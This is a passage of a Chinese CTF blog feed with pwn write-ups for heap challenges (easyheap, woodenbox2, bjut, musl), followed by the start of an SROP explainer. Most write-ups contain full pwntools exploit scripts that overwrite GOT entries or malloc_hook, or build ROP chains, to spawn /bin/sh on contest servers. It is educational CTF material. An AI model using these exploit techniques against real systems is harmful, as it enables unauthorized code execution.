title="思路"></a>思路</h3><p>首先申请俩次堆块都是0x10，然后free掉，看到add函数里是先进行malloc(0x10)，然后在做check，然后再申请check(0x400)，所以由于free之后会残留指针，在free掉俩个堆块之后，故意输入大数字让他check size fail直接返回，然后申请一个0x10的堆块就可以实现堆块重叠。通过edit前俩次的堆块来覆盖最后一次malloc的堆块的ptr指针来指向chunk_list的位置，然后伪造chunk结构指向got，并且show一下就可以知道libc了，然后修改free_got为system然后free一个内容为/bin/sh的堆块就可以开启shell。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]</span><br><span class="line">if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">io=process(&apos;./easyheap&apos;)</span><br><span class="line">lib=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">else:</span><br><span class="line">io=remote(&apos;121.36.209.145&apos;,9997)</span><br><span class="line">lib=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">elf=ELF(&apos;./easyheap&apos;)</span><br><span class="line"></span><br><span class="line">def choice(idx):</span><br><span class="line">    io.sendlineafter(&apos;Your choice:\n&apos;, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(size, content):</span><br><span class="line">    choice(1)</span><br><span class="line">    io.sendafter(&apos;this message?\n&apos;, str(size))</span><br><span class="line">    if size&lt; 0x400:</span><br><span class="line">    io.sendafter(&apos;content of the message?\n&apos;, content)</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">choice(2)</span><br><span class="line">io.sendlineafter(&apos;deleted?\n&apos;,str(idx))</span><br><span class="line"></span><br><span class="line">def edit(idx, content):</span><br><span class="line">    choice(3)</span><br><span class="line">    io.sendlineafter(&apos;modified?\n&apos;,str(idx))</span><br><span class="line">    io.sendafter(&apos;message?\n&apos;, content)</span><br><span class="line"></span><br><span class="line"># ------------------------------------------------</span><br><span class="line">onegadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]</span><br><span class="line">chunk_list=0x6020C0</span><br><span class="line"># ------------------------------------------------</span><br><span class="line">add(0x18,0x18 * &quot;\x10&quot;) #0</span><br><span class="line">add(0x18,0x18 * &quot;\x11&quot;) #1</span><br><span class="line">dele(0)</span><br><span class="line">add(0x500,&apos;&apos;)</span><br><span class="line">dele(1)</span><br><span class="line">add(0x500,&apos;&apos;)</span><br><span class="line"></span><br><span class="line">add(0x18,0x18 * &apos;\x12&apos;) #2</span><br><span class="line">edit(1,p64(0) + p64(0x18) + p64(chunk_list))</span><br><span class="line">edit(2,p64(chunk_list + 8) + p64(chunk_list))</span><br><span class="line">edit(0,p64(chunk_list + 8) + p64(chunk_list) + p64(chunk_list + 0x18) + p64(elf.got[&apos;free&apos;]) + p64(elf.got[&apos;__libc_start_main&apos;]) + p64(chunk_list + 0x30) + p64(elf.got[&apos;free&apos;]) + p64(elf.got[&apos;free&apos;]))</span><br><span class="line"></span><br><span class="line">edit(2,p64(elf.plt[&apos;puts&apos;]))</span><br><span class="line">dele(4)</span><br><span class="line">__libc_start_main = u64(io.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&apos;\x00&apos;))</span><br><span class="line">libc = __libc_start_main - lib.symbols[b&apos;__libc_start_main&apos;]</span><br><span class="line">lib.address = libc</span><br><span class="line">system = lib.symbols[&apos;system&apos;]</span><br><span class="line">binsh = lib.search(&quot;/bin/sh\x00&quot;).next()</span><br><span class="line">__dele_hook = lib.symbols[&apos;__free_hook&apos;]</span><br><span class="line">__malloc_hook = lib.symbols[&apos;__malloc_hook&apos;]</span><br><span class="line">__realloc_hook = lib.symbols[&apos;__realloc_hook&apos;]</span><br><span class="line"></span><br><span class="line">edit(5,p64(system))</span><br><span class="line">edit(0,p64(chunk_list + 8) + p64(binsh))</span><br><span class="line">dele(0)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="woodenbox2"><a href="#woodenbox2" class="headerlink" title="woodenbox2"></a>woodenbox2</h2><p>got表可写，其余保护全开</p><h3 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>change_item()函数里面没有对size做限制，堆溢出。</p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>题目难点在于没有输出功能，需要打io_file泄露libc基址。然后fastbin attack 打malloc_hook,这里onegadget失效，用realloc 调整偏移即可。<br>iofile泄露原理可参考EX师傅博客<a href="http://blog.eonew.cn/archives/1190" target="_blank" rel="noopener">http://blog.eonew.cn/archives/1190</a></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>成功率 16分之一<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    try:</span><br><span class="line">        if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">        io=process(&apos;./woodenbox2&apos;)</span><br><span class="line">        libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">        else:</span><br><span class="line">        io=remote(&apos;121.36.215.224&apos;,9998)</span><br><span class="line">        libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">        elf=ELF(&apos;./woodenbox2&apos;)</span><br><span class="line"></span><br><span class="line">        def choice(idx):</span><br><span class="line">            io.sendlineafter(&apos;Your choice:&apos;, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        def add(size, content):</span><br><span class="line">            choice(1)</span><br><span class="line">            io.sendlineafter(&apos;:&apos;, str(size))</span><br><span class="line">            io.sendafter(&apos;:&apos;, content)</span><br><span class="line"></span><br><span class="line">        def free(idx):</span><br><span class="line">        choice(3)</span><br><span class="line">        io.sendlineafter(&apos;:&apos;,str(idx))</span><br><span class="line"></span><br><span class="line">        def edit(idx,size, content):</span><br><span class="line">            choice(2)</span><br><span class="line">            io.sendlineafter(&apos;:&apos;,str(idx))</span><br><span class="line">            io.sendlineafter(&apos;:&apos;,str(size))</span><br><span class="line">            io.sendafter(&apos;:&apos;, content)</span><br><span class="line"></span><br><span class="line">        # ------------------------------------------------</span><br><span class="line">        iofile_off = [0x25dd,0xf5eb] #_IO_2_1_stderr_+157</span><br><span class="line">        onegadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]</span><br><span class="line"></span><br><span class="line">        # ------------------------------------------------</span><br><span class="line"></span><br><span class="line">        add(0x20,&apos;aaaa&apos;)#0</span><br><span class="line">        add(0x40,&apos;aaaa&apos;)#1</span><br><span class="line">        add(0x60,&apos;aaaa&apos;)#2</span><br><span class="line">        add(0xa0,&apos;aaaa&apos;)#3</span><br><span class="line"></span><br><span class="line">        edit(0,0x40,&apos;a&apos;*0x20+p64(0)+p64(0xc1))</span><br><span class="line">        free(1) #1</span><br><span class="line">        free(1) #2</span><br><span class="line">        add(0x40,&apos;bbbb&apos;) #0</span><br><span class="line">        edit(0,0x60,&apos;a&apos;*0x40+p64(0)+p64(0x71)+p16(iofile_off[0]))</span><br><span class="line">        add(0x60,&apos;aaaa&apos;) # 2</span><br><span class="line">        add(0x60,&apos;aaa&apos;+p64(0)*6+p64(0xfbad1800)+p64(0)*3+&quot;\x00&quot;) #3</span><br><span class="line">        io.recv(0x40)</span><br><span class="line">        leak=u64(io.recv(8))</span><br><span class="line">        info(hex(leak))</span><br><span class="line">        libc.address = leak-(0x7f35bc64a600-0x7f35bc285000)</span><br><span class="line">        log.success(hex(libc.address))</span><br><span class="line">        malloc_hook = libc.sym[&apos;__malloc_hook&apos;]</span><br><span class="line">        free_hook = libc.sym[&apos;__free_hook&apos;]</span><br><span class="line">        one = libc.address+onegadgets[1]</span><br><span class="line">        log.success(hex(malloc_hook))</span><br><span class="line"></span><br><span class="line">        add(0x60,&apos;cccc&apos;)#4</span><br><span class="line">        add(0x60,&apos;dddd&apos;)#5</span><br><span class="line">        free(5)</span><br><span class="line">        edit(0,0x100,0xa0*&apos;\x17&apos;+p64(0)+p64(0x71)+p64(malloc_hook-0x23))</span><br><span class="line">        add(0x60,&apos;bbbb&apos;)</span><br><span class="line">        add(0x60,&apos;d&apos;*0xb+p64(one)+p64(libc.symbols[&quot;realloc&quot;]+13))</span><br><span class="line">        choice(1)</span><br><span class="line">        io.sendlineafter(&apos;:&apos;, str(60))</span><br><span class="line">        io.interactive()</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(e)</span><br><span class="line">io.close()</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure></p><h2 id="bjut"><a href="#bjut" class="headerlink" title="bjut"></a>bjut</h2><p>got表可写，pie没开</p><h3 id="漏洞点-2"><a href="#漏洞点-2" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>show 和 edit功能，可以输入负数，造成数组上溢。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 edit()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [rsp+4h] [rbp-Ch]</span><br><span class="line">  unsigned __int64 v2; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(0x28u);</span><br><span class="line">  puts(&quot;The index of your hw:&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;v1);</span><br><span class="line">  if ( v1 &lt;= 15 &amp;&amp; qword_404140[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Input your hw:&quot;);</span><br><span class="line">    read(0, qword_404140[v1], dword_4040E0[v1]);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;out of range!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>通过数组上溢泄露free_got内容，然后修改 free_got为system，然后释放/bin/sh的堆块</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><h2 id="musl"><a href="#musl" class="headerlink" title="musl"></a>musl</h2><p>做这个题的时候当时是蒙的，使用的是musl libc跟平时的glibc有很大差异。其中最大的差异是muls不支持延迟绑定，没有 malloc_hook等<br>具体参考 <a href="https://my.oschina.net/u/2306127/blog/1592004" target="_blank" rel="noopener">https://my.oschina.net/u/2306127/blog/1592004</a></p><h3 id="漏洞点-3"><a href="#漏洞点-3" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>add功能有一次堆溢出的机会</p><h3 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h3><p>溢出修改size然后free造成overlapping<br>free时检查了in_use和下一个chunk的prev_size，提前伪造好prev_size<br>overlapping后再取出来，可以uaf，free chunk的链表头部在libc，uaf之后show泄露libc地址，然后edit把fd和bk改为0x602030，利用双向链表写fd bk的操作把一个堆地址写入0x602040，将heap_store劫持到堆上，实现任意地址读写<br>show和edit的次数有限制，但是可以通过任意地址读写覆盖计数器<br>got plt都不可写，没有hook<br>可以通过任意地址读写改写栈，getshell<br>利用任意地址读，读libc中的environ泄露栈地址，算出栈顶地址，然后利用任意地址写覆盖返回地址</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]</span><br><span class="line">if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">r=process([&apos;./libc.so&apos;,&apos;./carbon&apos;])</span><br><span class="line">libc=ELF(&apos;libc.so&apos;)</span><br><span class="line">else:</span><br><span class="line">r=remote(&apos;119.3.158.103&apos;,19008)</span><br><span class="line">libc=ELF(&apos;libc.so&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(size,data):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;1&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your prefer size? &gt;&apos;)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(&apos;Are you a believer? &gt;&apos;)</span><br><span class="line">    r.sendline(&apos;wdnmd&apos;)</span><br><span class="line">    r.recvuntil(&apos;Say hello to your new sleeve &gt;&apos;)</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line">def gg_add(size,data):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;1&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your prefer size? &gt;&apos;)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(&apos;Are you a believer? &gt;&apos;)</span><br><span class="line">    r.sendline(&apos;Y\x00&apos;)</span><br><span class="line">    r.recvuntil(&apos;Say hello to your new sleeve &gt;&apos;)</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;2&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your sleeve ID? &gt;&apos;)</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def edit(index,data):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;3&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your sleeve ID? &gt;&apos;)</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line">    sleep(0.5)</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;4&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your sleeve ID? &gt;&apos;)</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line"></span><br><span class="line">heap_store = 0x602030</span><br><span class="line">#add-symbol-file libc.so 0x8000000</span><br><span class="line">#x/64gx 0x82953b0</span><br><span class="line">#x/20gx 0x00007fffff7e0000</span><br><span class="line">add(0x10,&apos;gg&apos;)#0</span><br><span class="line">add(0x30,&apos;gg&apos;)#1</span><br><span class="line">add(0x50,p64(0)*6+p64(0x81)+p64(0xa1))#2</span><br><span class="line">add(0x40,&apos;gg&apos;)#3</span><br><span class="line">add(0x20,&apos;gg&apos;)#4</span><br><span class="line">add(0x20,p64(0x40)+p64(heap_store))#5</span><br><span class="line"></span><br><span class="line">free(0)</span><br><span class="line"></span><br><span class="line">gg_add(0x10,&apos;a&apos;*0x10+p64(0x21)+p64(0x81))#0</span><br><span class="line">free(1)</span><br><span class="line"></span><br><span class="line">add(0x30,&apos;gg&apos;)#1</span><br><span class="line">add(0x30,&apos;gg&apos;)#2 6</span><br><span class="line"></span><br><span class="line">free(2)</span><br><span class="line">show(6)</span><br><span class="line">leak = u64(r.recvuntil(&apos;Done.&apos;,drop=True).ljust(8,&apos;\x00&apos;))</span><br><span class="line">info(hex(leak))</span><br><span class="line">gdb.attach(r)</span><br><span class="line">pause()</span><br><span class="line">libc_base = leak-0x292ad8</span><br><span class="line">log.success(hex(libc_base))</span><br><span class="line">system = libc_base+libc.sym[&apos;system&apos;]</span><br><span class="line">edit(6,p64(heap_store)*2)</span><br><span class="line">free(4)</span><br><span class="line"></span><br><span class="line">add(0x30,p64(heap_store))#pwn</span><br><span class="line">environ = libc_base+0x294FD8</span><br><span class="line">log.success(hex(environ))</span><br><span class="line"></span><br><span class="line">add(0x60,p64(0x71)+p64(environ)+p64(0x71)+p64(libc_base+0x8295570-0x8000000))# environ 9 </span><br><span class="line">edit(5,p64(0))</span><br><span class="line">show(9)</span><br><span class="line">leak = u64(r.recvuntil(&apos;Done.&apos;,drop=True).ljust(8,&apos;\x00&apos;))</span><br><span class="line">stack_rsp = leak-0x118</span><br><span class="line">log.success(hex(stack_rsp))</span><br><span class="line">#gg_stack = 0x7ffffffee638</span><br><span class="line">#print(hex(gg_stack-stack_rsp))</span><br><span class="line">gg_stack = 0xa0+stack_rsp</span><br><span class="line">binsh = libc.search(&apos;/bin/sh\x00&apos;).next()+libc_base</span><br><span class="line">edit(10,p64(0x71)+p64(gg_stack)+&apos;/bin/sh&apos;.ljust(8,&apos;\x00&apos;)+p64(0)+p64(0x41)+p64(binsh))</span><br><span class="line">edit(5,p64(0))</span><br><span class="line">#show(12) test libc_addr</span><br><span class="line">pause()</span><br><span class="line">menu = 0x400c2f</span><br><span class="line">flag = libc_base+0x8295580-0x8000000</span><br><span class="line">pop_rdi_ret = libc_base+0x14862</span><br><span class="line">pop_rsi_ret = libc_base+0x1c237</span><br><span class="line">pop_rdx_ret = libc_base+0x1b92</span><br><span class="line"></span><br><span class="line">puts_addr = libc_base+libc.sym[&apos;puts&apos;]</span><br><span class="line">#edit(10,p64(menu)*10)</span><br><span class="line">edit(10,p64(menu)+p64(pop_rdi_ret)+p64(flag)+p64(system)+p64(menu))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;easyheap&quot;&gt;&lt;a href=&quot;#easyheap&quot; class=&quot;headerlink&quot; title=&quot;easyheap&quot;&gt;&lt;/a&gt;easyheap&lt;/h2&gt;&lt;p&gt;程序没开PIE，got表可写&lt;/p&gt;
&lt;h3 id=&quot;漏洞点&quot;&gt;&lt;a href=&quot;#漏洞点&quot;
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>SROP</title>
    <link href="https://nocbtm.github.io/2020/02/28/SROP/"/>
    <id>https://nocbtm.github.io/2020/02/28/SROP/</id>
    <published>2020-02-28T09:27:56.000Z</published>
    <updated>2020-04-11T13:41:49.269Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是SROP"><a href="#什么是SROP" class="headerlink" title="什么是SROP"></a>什么是SROP</h2><p><code>SROP</code> 全称<code>Sigreturn Oriented Programming</code>，<code>sigreturn</code>是一个系统调用，在类 unix 系统发生 signal 的时候会被间接地调用。</p><p>signal 机制是类 unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。一般来说，信号机制常见的步骤如下图所示：</p><p><img alt="" data-src="https://nocbtm.github.io/imgs/srop-1.png" class="lozad"></p><p>包含的流程包括：</p><ol><li>内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。</li><li>内核会为该进程保存相应的上下文，将当前的信息压入栈中（栈寄存器等），以及将 sigreturn系统调用地址压入栈中。需要注意的是，这一部分是在用户进程的地址空间的。之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码。</li><li>执行 sigreturn 系统调用，恢复之前保存的上下文，其中包括将所有压入的寄存器，重新 pop 回对应的寄存器，最后恢复进程的执行。其中，32 位的 sigreturn 的调用号为 119，64 位的系统调用号为 15。</li></ol><p>保存在栈中的进程上下文信息为<code>ucontext_t</code>结构体，称其为<code>Signal Frame</code>，其结构体定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// defined in /usr/include/sys/ucontext.h</span></span><br><span class="line"><span class="comment">/* Userlevel context.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ucontext_t</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> uc_flags;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ucontext_t</span> *<span class="title">uc_link</span>;</span></span><br><span class="line">    <span class="keyword">stack_t</span> uc_stack;           <span class="comment">// the stack used by this context</span></span><br><span class="line">    <span class="keyword">mcontext_t</span> uc_mcontext;     <span class="comment">// the saved context</span></span><br><span class="line">    <span class="keyword">sigset_t</span> uc_sigmask;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">libc_fpstate</span> __<span class="title">fpregs_mem</span>;</span></span><br><span class="line">  &#125; <span class="keyword">ucontext_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// defined in /usr/include/bits/types/stack_t.h</span></span><br><span class="line"><span class="comment">/* Structure describing a signal stack.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="keyword">void</span> *ss_sp;</span><br><span class="line">    <span class="keyword">size_t</span> ss_size;</span><br><span class="line">    <span class="keyword">int</span> ss_flags;</span><br><span class="line">  &#125; <span class="keyword">stack_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// difined in /usr/include/bits/sigcontext.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">__uint64_t</span> r8;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r9;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r10;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r11;</span><br><span class="line">  <span 